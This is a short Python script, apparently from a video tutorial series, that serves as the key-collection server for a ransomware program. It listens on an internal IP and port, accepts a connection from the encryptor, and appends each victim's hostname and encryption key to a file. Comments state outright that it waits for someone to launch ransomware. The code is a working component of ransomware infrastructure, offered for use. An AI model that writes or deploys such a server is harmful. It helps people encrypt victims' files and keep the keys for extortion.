import socket # import network comunicaion

# server waits utill someone launches ransomware
#once encryptor is launched random key is generated
# key is stored server with hostname

IP_ADDRESS = "10.23.95.87"
#The specific internal IP address where this server is sitting.
# clinet must point to this
PORT = 5678

print("Creating socket")

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    # binds process to ip and port
    print("Listening for connections" )
    s.listen(1)
    # waits for 1 connection
    conn, addr = s.accept()
    ## waits here till connect returns a new socket object (conn)
    # to talk to that specific user and their address (addr).
    print("Connected by", addr)
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            # Grabs up to 1024 bytes of data from the network.
            #Converts the raw binary bytes back into a readable string
            # (the hostname and key).
            with open("encrypted.txt", "a") as file:
                #new file in append mode
                file.write(host_and_key+"\n")
                #Writes the information received from the client into the text
                # file and adds a new line.
            break
        print("Connection completed and closed")

# https://www.youtube.com/watch?v=RZFNB3Swczs&list=PL8KnQ7ULK8egs86oy1gRRa21CGDrEefPw&index=7